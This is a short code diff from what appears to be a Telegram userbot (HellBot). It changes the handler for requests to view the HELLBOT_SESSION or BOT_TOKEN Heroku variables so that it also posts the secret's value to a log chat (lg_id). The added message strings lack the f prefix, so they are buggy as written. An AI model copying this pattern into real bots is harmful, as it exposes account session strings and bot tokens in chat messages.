@@ -62,9 +62,14 @@ async def variable(hell):
             variable = hell.pattern_match.group(2).split()[0]
             if variable in ("HELLBOT_SESSION", "BOT_TOKEN"):
                 if Config.ABUSE == "ON":
-                    return await bot.send_file(hell.chat_id, cjb, caption=cap)
+                    await bot.send_file(hell.chat_id, cjb, caption=cap)
+                    await hell.delete()
+                    await bot.send_message(lg_id, "#HELLBOT_SESSION \n\n`{heroku_var[variable]}`")
+                    return
                 else:
-                    return await hell.edit(f"**{capn}**")
+                    await hell.edit(f"**{capn}**")
+                    await bot.send_message(lg_id, "#HELLBOT_SESSION \n\n`{heroku_var[variable]}`")
+                    return
             if variable in heroku_var:
                 return await hell.edit(
                     "**Heroku Var** :" f"\n\n`{variable}` = `{heroku_var[variable]}`\n"
